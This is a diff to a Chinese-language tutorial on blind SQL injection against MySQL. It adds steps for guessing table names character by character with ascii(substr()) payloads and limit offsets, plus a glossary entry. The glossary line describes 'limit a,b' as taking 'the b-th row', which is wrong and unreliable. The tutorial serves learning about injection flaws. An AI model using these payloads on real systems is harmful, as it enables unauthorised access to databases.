@@ -199,8 +199,7 @@ MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' a
 
 `id=1 ' and left(database(),1)>"a" --+ `利用二分法可以快速猜解数据库名(os: 并非快速)
 
-# 困难预警
-(os:地狱绘图来的)
+困难预警(os:超级拼装)
 
 4. 猜测数据库中的数据表
 
@@ -228,8 +227,15 @@ mysql> show tables;
 
 `id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80 --+`
 
-仔细对照知识补充部分的函数解释来解读这段payload
+仔细对照知识补充部分的函数解释来解读这段payload(ascII编码为80的字符是`P`)
 
+(2) 猜测数据表的第二位字符
+
+只需改`substr(**,2,1)`
+
+(3) 猜测第二个数据表
+
+只需改`limit 1,1`
 
 
 
@@ -276,3 +282,9 @@ mysql> show tables;
 8. `substr()`
 
 含义: substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度
+
+9. `limit a,b`
+
+含义: 跳过前a行，取第b行
+
+
